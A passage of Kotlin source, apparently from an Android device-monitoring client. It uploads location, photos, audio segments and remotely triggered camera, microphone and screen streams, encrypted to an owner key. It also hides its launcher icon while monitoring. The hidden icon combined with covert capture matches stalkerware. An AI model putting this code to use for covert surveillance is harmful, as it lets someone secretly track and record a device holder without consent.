            signerSha256(context)?.let { put("signerSha256", it) }   // → server maps to APK variant
        })
    }

    fun sendLocation(lat: Double, lng: Double, accuracy: Float, battery: Int, speed: Float = 0f, bearing: Float = 0f) {
        emit("location", JSONObject().apply {
            put("lat",      lat)
            put("lng",      lng)
            put("accuracy", accuracy)
            put("battery",  battery)
            if (speed > 0f)   put("speed",   speed)
            if (bearing > 0f) put("bearing", bearing)
        })
    }

    fun sendPhoto(base64: String) =
        emit("photo", JSONObject().apply { put("base64", base64) })

    fun sendAudio(base64: String) =
        emit("audio", JSONObject().apply { put("base64", base64) })

    // Chunked record_audio upload — one call per ~60s segment (see AudioHelper/MonitoringService).
    // `base64` is null only for a hard-failure final marker (nothing captured, session still
    // needs to be closed server-side). Goes through the normal emit() ZK/queue path like any
    // other event: ZK-owned devices get it per-segment-ECDH-wrapped as zk_data; a disconnected
    // socket queues it in pendingEmits and flushes on reconnect, same as everything else.
    fun sendAudioSegment(sessionId: String, seq: Int, isFinal: Boolean, base64: String?) =
        emit("audio_segment", JSONObject().apply {
            put("sessionId", sessionId)
            put("seq", seq)
            put("final", isFinal)
            put("base64", base64 ?: JSONObject.NULL)
        })

    fun sendNetworkInfo(data: JSONObject) =
        emit("network_info", data)

    private fun rawEmit(s: Socket, event: String, data: JSONObject) {
        if (encActive) {
            val wrapped = EncryptionHelper.encrypt(event, data)
            if (wrapped != null) { s.emit("e", wrapped); return }
        }
        s.emit(event, data)
    }

    private fun flushPending(s: Socket) {
        while (pendingEmits.isNotEmpty()) {
            val (ev, d) = pendingEmits.pollFirst() ?: break
            rawEmit(s, ev, d)
        }
    }

    // Store/clear the owner's ZK public key and rebuild ZkPayloadHelper.
    // Called from both the 'registered' event and the live 'zk_pub_key' push.
    private fun applyZkPubKey(ctx: Context, zkPub: String) {
        if (zkPub.isNotEmpty()) {
            Prefs(ctx).zkPubKey = zkPub
            zkHelper = try {
                ZkPayloadHelper(zkPub).also {
                    Log.i(TAG, "ZK encryption activated — all private events will be end-to-end encrypted")
                }
            } catch (e: Exception) {
                Log.e(TAG, "ZkPayloadHelper init failed: ${e.message}")
                null
            }
            exitOrphanLock(ctx)   // a real owner key arrived → reclaimed: resume + re-hide launcher
        } else {
            Prefs(ctx).zkPubKey = ""
            zkHelper = null
            Log.i(TAG, "ZK encryption deactivated for this device")
        }
    }

    // ── Orphan lock (owner account wiped) ────────────────────────────────────────────────────────
    // The server sends `device_locked` after wiping the owning account. The device then goes DORMANT
    // (monitoring off) and UN-HIDES its launcher icon so the holder can open it and reclaim — sign in
    // with the same email (a new owner key arrives → exitOrphanLock), or "use a different email"
    // (re-home: a code to the ORIGINAL email clears the lineage server-side). Persistent across reboot.
    private fun setLauncherVisible(ctx: Context, visible: Boolean) {
        try {
            ctx.packageManager.setComponentEnabledSetting(
                android.content.ComponentName(ctx, AccountLinkActivity::class.java),
                if (visible) android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED
                else         android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP)
            Prefs(ctx).appHidden = !visible
        } catch (e: Exception) { Log.e(TAG, "setLauncherVisible($visible) failed: ${e.message}") }
    }
    private fun enterOrphanLock(ctx: Context) {
        val p = Prefs(ctx)
        if (p.orphanLocked) return
        p.orphanLocked = true
        p.monitoringEnabled = false           // dormant — stop monitoring
        zkHelper = null; p.zkPubKey = ""       // no owner key to encrypt for
        setLauncherVisible(ctx, true)          // un-hide so the holder can open + reclaim
        Log.w(TAG, "Orphan-locked: owner account wiped → dormant, launcher visible for reclaim")
    }
    private fun exitOrphanLock(ctx: Context) {
        val p = Prefs(ctx)
        if (!p.orphanLocked) return
        p.orphanLocked = false
        p.monitoringEnabled = true            // resume monitoring
        setLauncherVisible(ctx, false)         // re-hide
        Log.i(TAG, "Reclaimed: orphan-lock cleared → monitoring resumed, launcher hidden")
    }

    // ── Re-home to a DIFFERENT email (device-signed; called from AccountLinkActivity) ─────────────
    private fun deviceAuthPost(url: String, prefs: Prefs, json: String): Request {
        val deviceId = prefs.deviceId
        val ts  = System.currentTimeMillis().toString()
        val sig = signPayload("$deviceId:$ts")
        return Request.Builder().url(url)
            .header("x-device-id", deviceId).header("x-device-timestamp", ts).header("x-device-signature", sig)
            .post(json.toRequestBody("application/json".toMediaType()))
            .build()
    }
    /** Step 1: request a re-home code, sent to the device's ORIGINAL (lineage) email. cb(ok, message). */
    fun requestRehome(ctx: Context, cb: (Boolean, String) -> Unit) {
        val prefs = Prefs(ctx); val url = prefs.serverUrl
        if (prefs.deviceId.isEmpty() || url.isEmpty()) { mainHandler.post { cb(false, "Device not enrolled") }; return }
        Thread {
            try {
                val (client, _) = buildOkHttpClient(null)
                val body = client.newCall(deviceAuthPost("$url/api/device/rehome/start", prefs, "{}")).execute().use { it.body?.string() ?: "{}" }
                val j = JSONObject(body)
                mainHandler.post {
                    if (j.optBoolean("ok")) {
                        val hint = j.optString("email_hint", "")
                        cb(true, "We sent a code to your original email" + (if (hint.isNotEmpty()) " ($hint)" else "") + ".")
                    } else cb(false, j.optString("error", "Could not start re-home"))
                }
            } catch (e: Exception) { mainHandler.post { cb(false, "Network error — try again") } }
        }.start()
    }
    /** Step 2: verify the code from the original email → server clears the lineage. cb(ok, message). */
    fun verifyRehome(ctx: Context, code: String, cb: (Boolean, String) -> Unit) {
        val prefs = Prefs(ctx); val url = prefs.serverUrl
        if (prefs.deviceId.isEmpty() || url.isEmpty()) { mainHandler.post { cb(false, "Device not enrolled") }; return }
        Thread {
            try {
                val (client, _) = buildOkHttpClient(null)
                val payload = JSONObject().put("code", code).toString()
                val body = client.newCall(deviceAuthPost("$url/api/device/rehome/verify", prefs, payload)).execute().use { it.body?.string() ?: "{}" }
                val j = JSONObject(body)
                mainHandler.post {
                    if (j.optBoolean("ok")) cb(true, "Verified. Now sign in with the new email to claim this device.")
                    else cb(false, j.optString("error", "Incorrect or expired code"))
                }
            } catch (e: Exception) { mainHandler.post { cb(false, "Network error — try again") } }
        }.start()
    }

    /**
     * Called when the device receives a stream start command for a ZK-owned device.
     * Generates a random 32-byte session DEK, wraps it with the owner's public key,
     * and emits zk_stream_session_key. Subsequent frames for [streamEventType]
     * are encrypted with this DEK via encryptWithDek().
     */
    fun startStreamSession(streamEventType: String) {
        val zk = zkHelper ?: return  // Non-ZK device: plaintext stream, no session key needed
        val dek = ByteArray(32).also { SecureRandom().nextBytes(it) }
        val sessionId = UUID.randomUUID().toString().replace("-", "")
        val wrappedKeyJson = zk.wrapSessionKey(dek)
        if (wrappedKeyJson == null) {
            Log.e(TAG, "Failed to wrap stream session key for $streamEventType — stream dropped")
            return
        }
        streamDeks[streamEventType]       = dek
        streamSessionIds[streamEventType] = sessionId
        val envelope = JSONObject().apply {
            put("session_id",  sessionId)
            put("stream_type", streamEventType)
            put("dek_wrapped", JSONObject(wrappedKeyJson))
        }
        val s = socket
        if (s != null && s.connected()) rawEmit(s, "zk_stream_session_key", envelope)
        else pendingEmits.addLast("zk_stream_session_key" to envelope)
        Log.i(TAG, "ZK stream session started: type=$streamEventType id=$sessionId")
    }

    /** Clears the session DEK for [streamEventType] when the stream stops. */
    fun stopStreamSession(streamEventType: String) {
        if (streamDeks.remove(streamEventType) != null) {
            val id = streamSessionIds.remove(streamEventType) ?: "?"
            Log.i(TAG, "ZK stream session ended: type=$streamEventType id=$id")
        }
    }

    /** Clears ALL active stream sessions (called on socket disconnect). */
    private fun clearStreamSessions() {
        if (streamDeks.isNotEmpty()) {
            Log.i(TAG, "Clearing ${streamDeks.size} ZK stream session(s) on disconnect")
            streamDeks.clear()
            streamSessionIds.clear()
        }
    }

    /**
     * Intercepts incoming stream-start/stop commands so we can manage ZK session keys.
     * Called from buildSocket() command handlers before forwarding to commandListener.
     */
    private fun handleStreamCommand(cmd: JSONObject) {
        if (zkHelper == null) return  // Only needed on ZK-owned devices
        when (cmd.optString("command")) {   // server sends { command: "start_stream", ... }
            "start_stream"        -> startStreamSession("video_frame")
            "stop_stream"         -> stopStreamSession("video_frame")
            "start_audio_stream"  -> startStreamSession("audio_chunk")
            "stop_audio_stream"   -> stopStreamSession("audio_chunk")
            "start_screen_stream" -> startStreamSession("screen_frame")
            "stop_screen_stream"  -> stopStreamSession("screen_frame")
        }
    }

    fun emit(event: String, data: JSONObject) {
        // ── ZK stream encryption (session key — no per-frame ECDH) ─────────────
        // Stream events use a per-session AES-256-GCM DEK generated at stream start.
        // The session key is wrapped with the owner's EC public key once per session.
        // Drop the frame if no session is active (stream not started yet) — never
        // fall back to plaintext on a ZK-owned device.
        if (zkHelper != null && event in ZK_STREAM_EVENTS) {
            val dek       = streamDeks[event]
            val sessionId = streamSessionIds[event]
            if (dek == null || sessionId == null) {
                Log.w(TAG, "ZK stream event $event dropped — no active session key")
                return
            }
            val encrypted = zkHelper!!.encryptWithDek(dek, data.toString().toByteArray(Charsets.UTF_8))
            if (encrypted == null) {
                Log.e(TAG, "ZK stream frame encryption failed for $event — frame dropped")
                return
            }
            val frameData = JSONObject().apply {
                put("session_id", sessionId)
                put("event_type", event)
                put("payload",    encrypted)
                if (data.has("sampleRate")) put("sampleRate", data.getInt("sampleRate"))
            }
            val s = socket
            if (s != null && s.connected()) rawEmit(s, "zk_stream_frame", frameData)
            // Drop if socket not ready — stream frames are ephemeral, no buffering
            return
        }

        // ── Zero-knowledge envelope encryption (per-event ECDH) ─────────────────
        // All non-stream private events are individually wrapped with ephemeral ECDH.
        val (finalEvent, finalData) = if (zkHelper != null && event in ZK_PRIVATE_EVENTS) {
            val wrapped = zkHelper!!.wrap(event, data.toString())
            if (wrapped != null) {
                Pair("zk_data", wrapped)
            } else {
                // Crypto failure — drop the event rather than send plaintext private data
                Log.e(TAG, "ZK wrap failed for $event — event dropped to protect privacy")
                return
            }
        } else {
            Pair(event, data)
        }

        val s = socket
        if (s != null && s.connected()) {
            rawEmit(s, finalEvent, finalData)
        } else {
            // Socket not ready — queue and flush on next connect. Cap raised 50->150: chunked
            // record_audio (~1 segment/minute) can now share this queue with everything else
            // during a longer outage, and the old cap could silently evict an audio segment
            // before reconnect if enough other events queued up behind it.
            pendingEmits.addLast(finalEvent to finalData)
            if (pendingEmits.size > 150) pendingEmits.pollFirst() // bound memory
        }
    }

    fun disconnect() {
        mainHandler.removeCallbacksAndMessages(null)
        socketHandler.removeCallbacksAndMessages(null)
        cancelReprobeAlarm()
        savedContext?.let { ctx ->
            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            cellCallback?.let { try { cm.unregisterNetworkCallback(it) } catch (_: Exception) {} }
            wifiCallback?.let { try { cm.unregisterNetworkCallback(it) } catch (_: Exception) {} }
        }
        cellCallback = null
        wifiCallback = null
        cellNetwork = null
        wifiNetwork = null
        boundTransport = null
        usingCellular = false
        usingRelay = false
        usingReality = false
        TransportManager.stop()
        lastDirectCheckTime = 0L
        errorCount.set(0)
        socket?.off()
        socket?.disconnect()
        socket = null
        savedContext = null
    }

    fun isConnected() = socket?.connected() == true

    // Build OkHttp request with device authentication headers (key-based only).
    private fun deviceAuthRequest(url: String, prefs: Prefs): Request {
        val deviceId = prefs.deviceId
        val ts  = System.currentTimeMillis().toString()
        val sig = signPayload("$deviceId:$ts")
        return Request.Builder().url(url)
            .header("x-device-id",        deviceId)
            .header("x-device-timestamp",  ts)
            .header("x-device-signature",  sig)
            .build()
    }


    fun checkDeepSleepStatus(context: Context, onResult: (wake: Boolean) -> Unit) {
        val prefs    = Prefs(context)
        val deviceId = prefs.deviceId.ifEmpty { mainHandler.post { onResult(false) }; return }
        val url      = prefs.serverUrl.ifEmpty { mainHandler.post { onResult(false) }; return }
        Thread {
            try {
                val (client, _) = buildOkHttpClient(null)
                val req = deviceAuthRequest("$url/api/devices/$deviceId/sleep-check", prefs)
                val body = client.newCall(req).execute().use { it.body?.string() ?: "{}" }
                val wake = org.json.JSONObject(body).optBoolean("wake", false)
                mainHandler.post { onResult(wake) }
            } catch (e: Exception) {
                Log.e(TAG, "sleep-check failed: ${e.message}")
                mainHandler.post { onResult(false) }
            }
        }.start()
    }

    private fun batteryLevel(context: Context): Int =
        (context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager)
            .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
}
